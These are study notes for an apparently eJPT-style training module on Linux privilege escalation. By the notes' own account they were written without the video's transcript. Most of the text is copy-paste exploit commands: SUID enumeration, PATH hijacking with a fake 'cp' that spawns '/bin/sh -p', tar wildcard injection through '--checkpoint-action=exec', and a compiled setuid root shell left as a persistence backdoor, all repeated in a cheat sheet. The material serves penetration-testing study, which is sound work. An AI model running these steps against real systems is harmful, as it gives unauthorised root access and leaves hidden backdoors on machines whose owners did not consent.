## What the video covers (Introduction / big picture)
- Linux privilege escalation by exploiting a vulnerable locally installed program (typically SUID-root).
- How to enumerate SUID binaries and identify suspicious/custom programs.
- Analyzing binaries to find unsafe patterns (system calls, unqualified commands, wildcards).
- Exploiting PATH hijacking when a SUID program calls external commands without absolute paths.
- Using tracing tools (strings, ltrace, strace) to observe behavior and pinpoint exploit vectors.
- Demonstrating an alternative: abusing tar wildcard injection when a backup-like program uses globs.
- Post-exploitation: obtaining a stable root shell.

Note: No transcript was provided; the steps below are based on standard eJPT-style Linux PE flows for “exploiting a vulnerable program.” Replace example paths/names with those from your target.

## Flow (ordered)
1. Basic context: whoami, id, uname.
2. Enumerate SUID/SGID binaries; shortlist unusual/custom ones (often in /usr/local/bin, /opt).
3. Run the candidate binary to understand inputs/outputs.
4. Inspect with strings to spot hardcoded commands/configs.
5. Trace runtime with ltrace/strace to see system(), execve(), file access, and command usage.
6. If unqualified commands are used (e.g., “cp”, “tar”, “cat” without /bin/…): attempt PATH hijacking.
7. Create a malicious replacement command in a writable directory and prepend it to PATH.
8. Execute the SUID binary to trigger your payload and obtain a root shell (/bin/sh -p).
9. Optional: if the program uses tar with wildcards, stage files for tar wildcard injection.
10. If the program is a known vulnerable version, search for public local exploits (searchsploit).
11. Stabilize/root persistence (e.g., compile a tiny setuid wrapper, as permitted).
12. Clean up artifacts.

## Tools highlighted
- find, ls, file: discovery and triage of SUID/SGID binaries.
- strings: static inspection for system() use, command strings, paths.
- ltrace: traces library calls (e.g., system()) to see what’s executed.
- strace: traces syscalls (e.g., execve(), open()) to see exact binaries/paths.
- which, env, export: environment inspection and PATH control.
- gcc: compile a minimal setuid root shell wrapper (post-exploitation).
- searchsploit: lookup public local privilege-escalation exploits by program/version.

## Typical command walkthrough (detailed, copy-paste friendly)

Note: Replace example paths/names with your target program.

### 1) Baseline and SUID enumeration
```bash
# Context
whoami
id
uname -a

# Find SUID-root binaries (quietly)
find / -perm -4000 -type f 2>/dev/null | sort

# Also check capabilities (less common but useful)
getcap -r / 2>/dev/null

# Shortlist “unusual” SUID files (often in /usr/local/bin or /opt)
ls -la /usr/local/bin 2>/dev/null
ls -la /opt 2>/dev/null
```

Assume you identify a suspicious SUID binary, e.g. /usr/local/bin/backup.

```bash
BIN="/usr/local/bin/backup"
ls -la "$BIN"
file "$BIN"
```

### 2) Static and dynamic analysis
```bash
# Static strings to look for commands, system(), config paths, etc.
strings -a "$BIN" | less

# Library call trace: reveals system() and the commands passed to it
ltrace -s 2048 -o /tmp/ltrace.log "$BIN"
grep -iE 'system|popen' /tmp/ltrace.log

# Syscall trace: reveals execve/open and exact absolute paths if used
strace -f -o /tmp/strace.log "$BIN"
grep -iE 'execve|openat|access' /tmp/strace.log | tail -n 50
```

Key things to spot:
- Calls like system("cp …"), system("tar …"), system("cat …") without full paths (no /bin/cp).
- Use of wildcards like tar czf backup.tgz *.
- Attempted reads/writes to files you control.

### 3) Exploit: PATH hijacking (unqualified command in SUID program)
If strace/ltrace show an unqualified command (e.g., cp, tar, cat), hijack PATH so your malicious binary is executed with root’s effective UID.

```bash
# Pick the command you saw the program call without an absolute path.
# Example: 'cp' was called as just "cp" (bad).
TARGET_CMD="cp"

# Prepare a writable directory for your payload
WRK="/tmp/.pwn"
mkdir -p "$WRK"

# Malicious replacement that spawns a root shell with preserved privileges (-p)
cat > "$WRK/$TARGET_CMD" << 'EOF'
#!/bin/sh
exec /bin/sh -p
EOF
chmod +x "$WRK/$TARGET_CMD"

# Prepend our directory to PATH so the SUID program resolves our payload first
export PATH="$WRK:$PATH"
which "$TARGET_CMD"   # should point to /tmp/.pwn/cp (or equivalent)

# Trigger the SUID binary; if vulnerable, you get a root shell
"$BIN"
id
```

Notes:
- If the program uses absolute paths (e.g., /bin/cp), PATH hijack will not work.
- Some environments reset PATH for setuid; test and adjust accordingly.

### 4) Alternative exploit: tar wildcard injection (if the program uses tar with globs)
If you saw the program running something like tar czf /root/backup.tgz * inside a directory you can write to, you can inject malicious “files” that tar treats as options.

```bash
# Work in the directory the program tars with a wildcard (replace with the actual path)
DIR="/var/www/html"    # example; must be the directory tar runs in with '*'
cd "$DIR"

# Create malicious files that tar interprets as options
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"

# Payload that spawns a root shell (stderr/stdout tricks help visibility)
cat > shell.sh << 'EOF'
#!/bin/sh
exec /bin/sh -p <&2 >&2
EOF
chmod +x shell.sh

# Now trigger the SUID/backup program that runs 'tar ... *'
"$BIN"
id
```

Notes:
- This only works if the program passes a wildcard (e.g., *) to tar.
- If it uses absolute paths or ‘.’ rather than globs, this likely won’t work.

### 5) Post-exploitation: optional setuid root wrapper (for persistence)
Once root, you can drop a small setuid root shell (only if policy allows).

```bash
cat > /tmp/rootshell.c << 'EOF'
#include <unistd.h>
int main() { setuid(0); setgid(0); execl("/bin/sh","sh","-p",NULL); }
EOF
gcc /tmp/rootshell.c -o /tmp/rootshell
chown root:root /tmp/rootshell
chmod 4755 /tmp/rootshell

# Later:
#/tmp/rootshell
```

### 6) If the program is a known vulnerable version
```bash
# Identify program + version (strings, running with --version, dpkg -l / rpm -qa)
strings -a "$BIN" | head
"$BIN" --version 2>/dev/null || true

# Search for local exploits
searchsploit <program-name> <version>
```

## Practical tips
- Unusual SUID binaries in /usr/local/bin and /opt are prime targets.
- ltrace is great to quickly find system() strings; strace confirms exact execve paths.
- If PATH hijack fails, check strace: if absolute paths are used, try other angles (config injection, wildcard, writable script in called chain).
- Always verify write permissions for directories in the execution flow.
- Use /bin/sh -p to preserve effective UID in SUID contexts.
- Keep artifacts in /tmp and clean up after testing.

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Find SUID binaries
find / -perm -4000 -type f 2>/dev/null | sort

# 2) Pick suspicious binary and inspect
BIN="/usr/local/bin/backup"   # example
strings -a "$BIN" | less
ltrace -s 2048 -o /tmp/ltrace.log "$BIN"
strace -f -o /tmp/strace.log "$BIN"
grep -iE 'system|execve' /tmp/{ltrace,strace}.log

# 3) PATH hijack (if unqualified cmd seen, e.g., cp)
WRK="/tmp/.pwn"; mkdir -p "$WRK"
cat > "$WRK/cp" << 'EOF'
#!/bin/sh
exec /bin/sh -p
EOF
chmod +x "$WRK/cp"
export PATH="$WRK:$PATH"
"$BIN"

# 4) Tar wildcard (only if program runs "tar ... *" in a writable dir)
cd /path/that/gets/tarred
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
echo -e '#!/bin/sh\nexec /bin/sh -p <&2 >&2' > shell.sh; chmod +x shell.sh
"$BIN"

# 5) Post-exploit (optional)
# gcc rootshell, chown root:root, chmod 4755
```

## Summary
This module demonstrates Linux privilege escalation by exploiting a vulnerable program, focusing on unsafe usage patterns in SUID-root binaries. The core workflow is to enumerate SUID programs, analyze their behavior with strings/ltrace/strace, and exploit issues such as unqualified command execution via PATH hijacking or tar wildcard injection. With a successful trigger, you obtain a root shell (using /bin/sh -p), after which you can stabilize access as permitted. Because no transcript was provided, commands and paths above are based on common eJPT-style scenarios—adjust them to your target’s actual binaries and traces.
